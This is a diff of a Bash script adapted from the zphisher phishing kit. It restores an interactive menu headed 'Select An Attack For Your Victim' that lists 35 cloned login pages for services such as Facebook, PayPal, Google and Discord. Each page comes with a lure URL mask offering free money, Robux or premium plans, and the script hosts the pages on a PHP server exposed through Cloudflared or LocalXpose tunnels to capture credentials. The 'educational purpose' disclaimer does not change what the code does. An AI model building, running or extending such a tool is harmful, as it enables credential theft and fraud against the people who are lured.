@@ -44,7 +44,7 @@ fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Thanks for using me. Have a nice day meow." 2>&1; reset_color; }
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
 	exit 0
 }
 
@@ -75,7 +75,7 @@ kill_pid() {
 
 # Check for a newer release
 check_update(){
-	
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
 	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
 	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
@@ -107,26 +107,41 @@ check_update(){
 
 ## Check Internet Status
 check_status() {
-	
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
-	
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
 
 ## Banner
 banner() {
 	cat <<- EOF
+		${HOTPINK}                                      ${GRAY_SUIT}
+		${HOTPINK}   __      __                         ${GRAY_SUIT}      _     _     _               
+		${HOTPINK}  |   \  /   |                        ${GRAY_SUIT}     | |   (_)   | |              
+		${HOTPINK}  | |\ \/ /| | ___ ,---,__    __    __${GRAY_SUIT}_ __ | |__  _ ___| |__   ___ _ __ 
+		${HOTPINK}  | | \  / | |/ _ \ ,-, \ \  /  \  / /${GRAY_SUIT} '_ \| '_ \| / __| '_ \ / _ \ '__|
+		${HOTPINK}  | |  \/  | |  __/ '-' /\ \/ /\ \/ /${GRAY_SUIT}| |_) | | | | \__ \ | | |  __/ |   
+		${HOTPINK}  |_|      |_|\___)'---'  \__/  \__/ ${GRAY_SUIT}| .__/|_| |_|_|___/_| |_|\___|_|   
+		${HOTPINK}                                     ${GRAY_SUIT}| |                                
+		${HOTPINK}                                     ${GRAY_SUIT}|_|                ${SKY_BLUE}Version : ${__version__}
+
+		${RED}[${WHITE}-${RED}]${SKY_BLUE} Tool Created By Sachess and Dick${WHITE}
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
+		${RED}
+		${RED}  ░█▄░▄█░█▀▀░█▀█░█░░▄░░█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
+		${RED}  ░█░▀░█░█▀▀░█░█░▀█▄█▄█▀░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
+		${RED}  ░▀░░░▀░▀▀▀░▀▀▀░░░▀░▀░░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${SKY_BLUE} ${__version__}
 	EOF
 }
 
 ## Dependencies
 dependencies() {
-	
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
 
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
 		if [[ ! $(command -v proot) ]]; then
@@ -141,7 +156,7 @@ dependencies() {
 	fi
 
 	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
-		echo -e ""
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
 	else
 		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
@@ -200,9 +215,9 @@ download() {
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
-		echo -e ""
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
 	else
-		
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
@@ -219,9 +234,9 @@ install_cloudflared() {
 ## Install LocalXpose
 install_localxpose() {
 	if [[ -e ".server/loclx" ]]; then
-		echo -e ""
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
 	else
-		
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
@@ -247,9 +262,17 @@ about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 
+		${WHITE} ${REDBG}Warning:${RESETBG}
+		${CYAN}  This Tool is made for educational purpose 
+		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
+		  any misuse of this toolkit ${RED}!${WHITE}
+	
+
+		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+
 	EOF
 
-	
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 	case $REPLY in 
 		99)
 			msg_exit;;
@@ -264,31 +287,29 @@ about() {
 
 ## Choose custom port
 cusport() {
-echo
-P_ANS="y"  # Set P_ANS to "y" to always use a custom port
-
-if [[ ${P_ANS} =~ ^([yY])$ ]]; then
-    echo -e "\n"
-    CU_P="1234"  # Set a default custom port, change this value if needed
-    if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
-        PORT=${CU_P}
-        echo
-    else
-        echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
-        { sleep 2; clear; banner_small; cusport; }
-    fi        
-else 
-    echo -ne ""
-fi
-
+	echo
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
+		echo -e "\n"
+		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
+			PORT=${CU_P}
+			echo
+		else
+			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
+			{ sleep 2; clear; banner_small; cusport; }
+		fi		
+	else 
+		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
+	fi
 }
 
 ## Setup website and start php server
 setup_site() {
-	
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
-	
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
@@ -336,9 +357,9 @@ capture_data() {
 start_cloudflared() { 
 	rm .cld.log > /dev/null 2>&1 &
 	cusport
-	
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
@@ -372,12 +393,12 @@ localxpose_auth() {
 ## Start LocalXpose (Again...)
 start_loclx() {
 	cusport
-	
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
-	
+	echo -e "\n"
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
@@ -394,42 +415,54 @@ start_loclx() {
 ## Start localhost
 start_localhost() {
 	cusport
-	
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
-	
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
+## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
+		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+
 	EOF
 
-	# Set REPLY to 2 directly
-	REPLY=2
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
 
-	start_cloudflared
+	case $REPLY in 
+		1 | 01)
+			start_localhost;;
+		2 | 02)
+			start_cloudflared;;
+		3 | 03)
+			start_loclx;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; tunnel_menu; };;
+	esac
 }
-
-
 
 ## Custom Mask URL
 custom_mask() {
-{ sleep .5; clear; banner_small; echo; }
-mask_op="n"  # Set mask_op to "n" to always say "no"
-
-if [[ ${mask_op,,} == "y" ]]; then
-   
-    read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
-    if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
-        mask=$mask_url
-        
-    else
-        echo -e ""
-    fi
-fi
-
+	{ sleep .5; clear; banner_small; echo; }
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	echo
+	if [[ ${mask_op,,} == "y" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
+		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
+			mask=$mask_url
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+		fi
+	fi
 }
 
 ## URL Shortner
@@ -606,23 +639,171 @@ site_vk() {
 
 ## Menu
 main_menu() {
-{ clear; banner; echo; }
+	{ clear; banner; echo; }
 	cat <<- EOF
+		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${CYAN}[${WHITE}::${CYAN}]${ORANGE}
+
+		${BLUEORCHID}[${WHITE}01${BLUEORCHID}]${CITRUS} Facebook      ${BLUEORCHID}[${WHITE}11${BLUEORCHID}]${CITRUS} Twitch       ${BLUEORCHID}[${WHITE}21${BLUEORCHID}]${CITRUS} DeviantArt
+		${BLUEORCHID}[${WHITE}02${BLUEORCHID}]${CITRUS} Instagram     ${BLUEORCHID}[${WHITE}12${BLUEORCHID}]${CITRUS} Pinterest    ${BLUEORCHID}[${WHITE}22${BLUEORCHID}]${CITRUS} Badoo
+		${BLUEORCHID}[${WHITE}03${BLUEORCHID}]${CITRUS} Google        ${BLUEORCHID}[${WHITE}13${BLUEORCHID}]${CITRUS} Snapchat     ${BLUEORCHID}[${WHITE}23${BLUEORCHID}]${CITRUS} Origin
+		${BLUEORCHID}[${WHITE}04${BLUEORCHID}]${CITRUS} bullshit      ${BLUEORCHID}[${WHITE}14${BLUEORCHID}]${CITRUS} Linkedin     ${BLUEORCHID}[${WHITE}24${BLUEORCHID}]${CITRUS} DropBox	
+		${BLUEORCHID}[${WHITE}05${BLUEORCHID}]${CITRUS} Netflix       ${BLUEORCHID}[${WHITE}15${BLUEORCHID}]${CITRUS} Ebay         ${BLUEORCHID}[${WHITE}25${BLUEORCHID}]${CITRUS} Yahoo		
+		${BLUEORCHID}[${WHITE}06${BLUEORCHID}]${CITRUS} Paypal        ${BLUEORCHID}[${WHITE}16${BLUEORCHID}]${CITRUS} Quora        ${BLUEORCHID}[${WHITE}26${BLUEORCHID}]${CITRUS} Wordpress
+		${BLUEORCHID}[${WHITE}07${BLUEORCHID}]${CITRUS} Steam         ${BLUEORCHID}[${WHITE}17${BLUEORCHID}]${CITRUS} Protonmail   ${BLUEORCHID}[${WHITE}27${BLUEORCHID}]${CITRUS} Yandex			
+		${BLUEORCHID}[${WHITE}08${BLUEORCHID}]${CITRUS} Twitter       ${BLUEORCHID}[${WHITE}18${BLUEORCHID}]${CITRUS} Spotify      ${BLUEORCHID}[${WHITE}28${BLUEORCHID}]${CITRUS} StackoverFlow
+		${BLUEORCHID}[${WHITE}09${BLUEORCHID}]${CITRUS} Playstation   ${BLUEORCHID}[${WHITE}19${BLUEORCHID}]${CITRUS} Reddit       ${BLUEORCHID}[${WHITE}29${BLUEORCHID}]${CITRUS} Vk
+		${BLUEORCHID}[${WHITE}10${BLUEORCHID}]${CITRUS} Tiktok        ${BLUEORCHID}[${WHITE}20${BLUEORCHID}]${CITRUS} Adobe        ${BLUEORCHID}[${WHITE}30${BLUEORCHID}]${CITRUS} Microsoft
+		${BLUEORCHID}[${WHITE}31${BLUEORCHID}]${CITRUS} Mediafire     ${BLUEORCHID}[${WHITE}32${BLUEORCHID}]${CITRUS} Gitlab       ${BLUEORCHID}[${WHITE}33${BLUEORCHID}]${CITRUS} Github
+		${BLUEORCHID}[${WHITE}34${BLUEORCHID}]${CITRUS} Discord       ${BLUEORCHID}[${WHITE}35${BLUEORCHID}]${CITRUS} Roblox 
+
+		${BLUEORCHID}[${WHITE}99${BLUEORCHID}]${CITRUS} About         ${BLUEORCHID}[${WHITE}00${BLUEORCHID}]${CITRUS} Exit
 
 	EOF
 	
-	REPLY=30
+	read -p "${BLUEORCHID}[${WHITE}-${BLUEORCHID}]${LIGHTSABER_GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
+		1 | 01)
+			site_facebook;;
+		2 | 02)
+			site_instagram;;
+		3 | 03)
+			site_gmail;;
+		4 | 04)
+			website="microsoft"
+			mask='https://unlimited-onedrive-space-for-free'
+			tunnel_menu;;
+		5 | 05)
+			website="netflix"
+			mask='https://upgrade-your-netflix-plan-free'
+			tunnel_menu;;
+		6 | 06)
+			website="paypal"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		7 | 07)
+			website="steam"
+			mask='https://steam-500-usd-gift-card-free'
+			tunnel_menu;;
+		8 | 08)
+			website="twitter"
+			mask='https://get-blue-badge-on-twitter-free'
+			tunnel_menu;;
+		9 | 09)
+			website="playstation"
+			mask='https://playstation-500-usd-gift-card-free'
+			tunnel_menu;;
+		10)
+			website="tiktok"
+			mask='https://tiktok-free-liker'
+			tunnel_menu;;
+		11)
+			website="twitch"
+			mask='https://unlimited-twitch-tv-user-for-free'
+			tunnel_menu;;
+		12)
+			website="pinterest"
+			mask='https://get-a-premium-plan-for-pinterest-free'
+			tunnel_menu;;
+		13)
+			website="snapchat"
+			mask='https://view-locked-snapchat-accounts-secretly'
+			tunnel_menu;;
+		14)
+			website="linkedin"
+			mask='https://get-a-premium-plan-for-linkedin-free'
+			tunnel_menu;;
+		15)
+			website="ebay"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		16)
+			website="quora"
+			mask='https://quora-premium-for-free'
+			tunnel_menu;;
+		17)
+			website="protonmail"
+			mask='https://protonmail-pro-basics-for-free'
+			tunnel_menu;;
+		18)
+			website="spotify"
+			mask='https://convert-your-account-to-spotify-premium'
+			tunnel_menu;;
+		19)
+			website="reddit"
+			mask='https://reddit-official-verified-member-badge'
+			tunnel_menu;;
+		20)
+			website="adobe"
+			mask='https://get-adobe-lifetime-pro-membership-free'
+			tunnel_menu;;
+		21)
+			website="deviantart"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		22)
+			website="badoo"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		23)
+			website="origin"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		24)
+			website="dropbox"
+			mask='https://get-1TB-cloud-storage-free'
+			tunnel_menu;;
+		25)
+			website="yahoo"
+			mask='https://grab-mail-from-anyother-yahoo-account-free'
+			tunnel_menu;;
+		26)
+			website="wordpress"
+			mask='https://unlimited-wordpress-traffic-free'
+			tunnel_menu;;
+		27)
+			website="yandex"
+			mask='https://grab-mail-from-anyother-yandex-account-free'
+			tunnel_menu;;
+		28)
+			website="stackoverflow"
+			mask='https://get-stackoverflow-lifetime-pro-membership-free'
+			tunnel_menu;;
+		29)
+			site_vk;;
 		30)
 			website="xbox"
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
+		31)
+			website="mediafire"
+			mask='https://get-1TB-on-mediafire-free'
+			tunnel_menu;;
+		32)
+			website="gitlab"
+			mask='https://get-1k-followers-on-gitlab-free'
+			tunnel_menu;;
+		33)
+			website="github"
+			mask='https://get-1k-followers-on-github-free'
+			tunnel_menu;;
+		34)
+			website="discord"
+			mask='https://get-discord-nitro-free'
+			tunnel_menu;;
+		35)
+			website="roblox"
+			mask='https://get-free-robux'
+			tunnel_menu;;
+		99)
+			about;;
+		0 | 00 )
+			msg_exit;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; main_menu; };;
+	
 	esac
-
 }
 
 ## Main
